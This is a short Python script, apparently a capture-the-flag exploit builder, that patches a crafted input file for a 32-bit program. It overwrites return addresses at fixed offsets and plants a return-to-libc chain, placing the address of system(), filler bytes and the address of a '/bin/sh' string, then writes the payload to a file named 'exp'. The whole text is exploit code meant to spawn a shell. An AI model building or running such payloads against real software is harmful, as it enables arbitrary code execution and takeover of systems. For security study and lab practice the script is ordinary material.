import sys, struct

addr = 0x080490d1
offset = 841

with open(sys.argv[1], 'rb') as fd:
    data = fd.read()

nd = data[:offset] + struct.pack('<I', addr) + data[offset+4:]

addr = 0x080490db
offset = 0x219
nd = nd[:offset] + struct.pack('<I', addr) + nd[offset+4:]

system_addr = 0x08048890
binsh_addr = 0x0806c6b7
offset = 0x323
nd = nd[:offset] + struct.pack('<I', system_addr) + 'HHHH' + struct.pack('<I', binsh_addr) + nd[offset+12:]

with open('exp', 'wb') as fd:
    fd.write(nd)
